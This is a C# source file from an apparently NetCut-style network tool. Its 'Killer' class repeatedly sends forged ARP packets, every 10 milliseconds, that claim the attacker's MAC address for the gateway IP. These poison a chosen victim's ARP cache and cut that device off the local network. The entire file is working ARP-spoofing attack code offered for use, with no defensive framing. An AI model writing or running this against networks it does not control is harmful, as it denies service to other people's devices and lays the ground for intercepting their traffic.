using NetManager.Core.Models;
using PacketDotNet;
using SharpPcap.LibPcap;

namespace NetManager.Core.Services;

internal class Killer
{
    private Scanner _scanner;
    private DeviceManager _deviceManager;
    private LibPcapLiveDevice? _device;

    public Killer(Scanner scanner, DeviceManager deviceManager)
    {
        _scanner = scanner;
        _deviceManager = deviceManager;

    }

    public void Start()
    {
        _device ??= _deviceManager.CreateDevice("ip", null);
    }

    public void Kill(Client victim)
    {
        var hasClient = _scanner.GetClients().TryGetValue(victim.Mac.ToString(), out Client? client);
        if (!hasClient) return;
        if (client!.IsLocalDevice() || client.IsGateway()) return;
        client!.IsKilled = true;

        Task.Run(async () =>
        {
            while (ShouldKill(client))
            {
                SpoofTarget(client);
                await Task.Delay(10);
            }
        });
    }

    public void UnKill(Client victim)
    {
        var hasClient = _scanner.GetClients().TryGetValue(victim.Mac.ToString(), out Client? client);
        if (!hasClient) return;
        client!.IsKilled = false;
    }

    private bool ShouldKill(Client victim)
    {
        return _scanner.GetClients().ContainsKey(victim.Mac.ToString()) && _scanner.GetClients()[victim.Mac.ToString()].IsKilled;
    }

    private void SpoofTarget(Client client)
    {
        var arpPacket = new ArpPacket(ArpOperation.Request,
                    targetHardwareAddress: client.Mac,
                    targetProtocolAddress: client.Ip,
                    senderHardwareAddress: HostInfo.HostMac,
                    senderProtocolAddress: HostInfo.GatewayIp);

        var etherPacket = new EthernetPacket(
            sourceHardwareAddress: HostInfo.HostMac,
            destinationHardwareAddress: client.Mac,
            EthernetType.Arp)
        {
            PayloadPacket = arpPacket
        };
        _device?.SendPacket(etherPacket.Bytes);
    }
}
